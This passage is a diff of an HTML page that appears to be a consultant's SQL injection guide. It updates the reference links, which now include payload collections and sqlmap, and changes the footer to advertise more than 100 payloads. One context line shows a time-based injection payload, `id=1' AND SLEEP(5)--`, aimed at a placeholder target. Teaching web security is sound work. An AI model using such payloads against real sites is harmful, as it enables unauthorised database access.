-        <li><a href="https://cwe.mitre.org/data/definitions/89.html" style="color: var(--primary);">CWE-89: SQL Injection</a></li>
-        <li><a href="https://portswigger.net/web-security/sql-injection" style="color: var(--primary);">PortSwigger: SQL Injection</a></li>
+        <li><a href="https://owasp.org/www-community/attacks/SQL_Injection" class="reference-link" target="_blank">OWASP: SQL Injection</a></li>
+        <li><a href="https://portswigger.net/web-security/sql-injection" class="reference-link" target="_blank">PortSwigger: SQL Injection</a></li>
+        <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection" class="reference-link" target="_blank">PayloadsAllTheThings: SQL Injection</a></li>
+        <li><a href="https://github.com/coffinxp/payloads/blob/main/SQL.txt" class="reference-link" target="_blank">CoffinXP: SQL Payloads</a></li>
+        <li><a href="https://www.thehacker.recipes/web/inputs/sql-injections" class="reference-link" target="_blank">The Hacker Recipes: SQL Injections</a></li>
+        <li><a href="https://cwe.mitre.org/data/definitions/89.html" class="reference-link" target="_blank">CWE-89: SQL Injection</a></li>
+        <li><a href="https://sqlmap.org/" class="reference-link" target="_blank">SQLmap - Automatic SQL Injection Tool</a></li>
       </ul>
     </div>
 
@@ -292,7 +518,7 @@ https://target.com/page?id=1' AND SLEEP(5)--</pre>
   </div>
 </main>
 
-<footer><p>Saikumar Raju — Cybersecurity Consultant | SQL Injection - Complete Guide</p></footer>
+<footer><p>Saikumar Raju — Cybersecurity Consultant | SQL Injection - Complete Guide with 100+ Payloads</p></footer>
 
 <script>
   const mobileBtn = document.getElementById('mobileMenuBtn');
